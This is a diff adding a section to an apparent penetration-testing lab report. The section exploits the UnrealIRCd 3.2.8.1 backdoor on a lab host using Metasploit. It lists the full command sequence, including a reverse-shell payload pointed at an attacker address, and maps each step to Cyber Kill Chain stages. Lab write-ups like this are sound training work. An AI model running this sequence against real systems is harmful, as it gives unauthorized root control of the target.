@@ -202,3 +202,38 @@ Host script results:
   vulnerability in Samba's configuration handling.
 
 ---
+## Exploit 3: UnrealIRCd 3.2.8.1 Backdoor Command Execution
+
+- **Service / Port:** IRC / 6667
+- **Vulnerability:** A malicious backdoor was planted in the UnrealIRCd 3.2.8.1 source distribution
+  (CVE-2010-2075) — sending a specially crafted string to the IRC server executes it as a shell
+  command.
+- **Tool Used:** Metasploit — exploit/unix/irc/unreal_ircd_3281_backdoor
+- **Why This Tool:** Nmap fingerprinted UnrealIRCd running on port 6667, a version known to contain
+  this planted backdoor. The default staged Meterpreter payload for this module failed to complete
+  the connection on this run (likely due to the HTTP payload-fetch stage timing out), so the payload
+  was switched to `cmd/unix/reverse` — a simpler, single-stage reverse shell that doesn't require the
+  target to fetch a second-stage payload over HTTP, making it more reliable on constrained lab networks.
+- **Steps:**
+  1. `nmap -sV -sC 192.168.1.3` — identified UnrealIRCd on port 6667 (Reconnaissance)
+  2. `msfconsole` then `search unreal` — found `exploit/unix/irc/unreal_ircd_3281_backdoor` (Weaponization)
+  3. `use exploit/unix/irc/unreal_ircd_3281_backdoor`, `set RHOSTS 192.168.1.3`
+  4. `set PAYLOAD cmd/unix/reverse`, `set LHOST 192.168.1.4` — switched to a simpler payload after
+     the default staged payload failed to establish a session
+  5. `run` — module registered a fake IRC user to trigger detection, confirmed the vulnerable version,
+     then sent the backdoor command (Delivery/Exploitation), opening a command shell session (Installation/C2)
+  6. `whoami`, `id`, `uname -a` confirmed root access (Actions on Objectives)
+- **Evidence:** evidence/exploit3.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
+  - **Reconnaissance:** nmap identified the IRC service and its version.
+  - **Weaponization:** selecting the matching backdoor module and choosing a payload suited to the
+    network conditions.
+  - **Delivery:** the module connecting to port 6667 and sending the crafted IRC registration/backdoor string.
+  - **Exploitation:** the planted backdoor code executing the delivered command.
+  - **Installation:** the reverse shell establishing a running connection back to the attacker.
+  - **C2:** the open command shell session providing ongoing control of the target.
+  - **Actions on Objectives:** confirming and using root access via whoami/id/uname -a.
+- **Outcome / Impact:** Full unauthenticated remote command execution as root via a second distinct
+  planted backdoor, on a service unrelated to the FTP or Samba vulnerabilities already exploited.
+
+---
